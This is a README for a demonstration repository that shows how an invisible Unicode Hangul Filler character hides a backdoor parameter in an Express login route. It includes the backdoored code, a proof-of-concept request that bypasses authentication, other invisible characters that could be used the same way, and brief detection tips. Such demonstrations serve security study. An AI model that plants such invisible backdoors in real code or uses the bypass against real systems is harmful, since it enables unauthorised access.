# Unicode Hangul Filler Backdoor

## Overview

This repository demonstrates how invisible Unicode characters, specifically the Hangul Filler character (U+3164), can be exploited to create hidden backdoors in web applications.

## How It Works

The backdoor exploits invisible Unicode characters in two key ways:

1. **Invisible Parameter Extraction**: Using an invisible Hangul Filler character in destructuring assignment that creates a hidden variable
2. **Hidden Array Element**: Appending an invisible element to an array of valid password hashes

### The Invisible Character

The character used is HANGUL FILLER (U+3164, hex: e3 85 a4), which appears as empty space but is actually a valid Unicode character.

## Technical Details

### The Backdoor Mechanism

In the vulnerable code:

```javascript
app.get('/login', (req, res) => {
    try {
        const { password,ㅤ} = req.query;  // Hidden Hangul Filler after password

        const validHash = [
            '420165201ce6a87ff3f869445a8ba0004b5f2644c63f2b7af551b93b1a03898c',
            'a48aa637f364c4f5564cd4bae216910354cdc305ef8abcbcdaab8ab666363eed',
            '7fbc154e4e245a4e377e5d15245b98370702fd01a4ec5b007f57bd008b0a5534',ㅤ  // Hidden Hangul Filler here
        ];
        
        // Login validation continues...
```

What this actually does (if we replace the invisible character with a visible name):

```javascript
const { password, backdoor } = req.query;
const validHash = [
    '420165201ce6a87ff3f869445a8ba0004b5f2644c63f2b7af551b93b1a03898c',
    'a48aa637f364c4f5564cd4bae216910354cdc305ef8abcbcdaab8ab666363eed',
    '7fbc154e4e245a4e377e5d15245b98370702fd01a4ec5b007f57bd008b0a5534',
    backdoorHash
];
```

## Exploiting the Backdoor

The backdoor can be exploited by sending a request with the hidden parameter:

```javascript
const crypto = require('crypto');
password = "backdoor" // can be any string

const hash = crypto.createHash('sha256').update(password).digest('hex');

// Send request with the invisible parameter (URL encoded as %E3%85%A4)
fetch(`http://server:8000/login?password=${password}&%E3%85%A4=${hash}`)
  .then(response => response.text())
  .then(data => console.log('Response:', data))
  .catch(error => console.error('Error:', error));
```

## Detection and Prevention

### Tools for Detection

1. **VSCode and modern code editors** will highlight unusual Unicode characters
2. **Hex editors** can reveal hidden Unicode characters
3. **Code reviews** should include checks for invisible characters


## Alternative Invisible Characters

Other invisible characters that could possible be used for similar attacks:

- Zero-Width Space (U+200B) - URL encoded as `%E2%80%8B`
- Half-width Hangul Filler (U+FFA0)

## Installation and Usage

1. Clone the repository
   ```
   git clone https://github.com/yourusername/unicode-hangul-backdoor
   ```

2. Install dependencies
   ```
   npm install
   ```

3. Run the server
   ```
   node main.js
   ```

4. Access the demo application at `http://localhost:8000`

## Files

- `main.js` - The vulnerable Express application
- `poc.js` - Proof of concept exploit
- `views/` - EJS templates for the application

## References

- [Unicode Security Considerations](https://www.unicode.org/reports/tr36/)
- [The Trojan Source Attack](https://trojansource.codes/)
- [Unicode Confusables](https://www.unicode.org/Public/security/latest/confusables.txt)

## License

This project is licensed under the MIT License - see the LICENSE file for details.
